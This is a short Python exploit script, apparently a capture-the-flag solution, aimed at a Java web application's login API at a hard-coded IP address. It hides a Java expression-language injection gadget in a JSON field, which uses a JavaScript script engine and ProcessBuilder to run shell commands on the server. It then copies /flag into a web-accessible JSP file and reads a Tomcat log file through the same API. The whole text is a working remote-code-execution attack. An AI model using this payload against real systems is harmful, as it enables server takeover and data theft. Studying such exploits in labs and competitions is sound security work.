import requests

url = 'http://106.240.19.118:8080/api/login'


def inject_gadgets(cmd):
	headers = {"Content-Type" : "application/json"}
	gadget = '''${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c',\''''+cmd+'''\']).start()")}'''
	gadget = gadget.replace("\"","\\\"")
	data = '''{"user_id":"adsf","user_pw":"sadfaf","user_data":["com.main.util.mailTemplate","'''+gadget+'''"]}'''
	requests.post(url,data,headers=headers)
def load_catalina():
	headers = {"Content-Type" : "application/json"}
	data = '''{"user_id":"adsf","user_pw":"sadfaf","user_data":["com.main.util.mailTemplate","/proc/self/cwd/logs/catalina.out"]}'''
	print(requests.post(url,data,headers=headers).text);

inject_gadgets('cat /flag > /proc/self/cwd/webapps/ROOT/asdfadsfasfsdfs.jsp')
load_catalina()

r = requests.get('http://106.240.19.118:8080/asdfadsfasfsdfs.jsp')
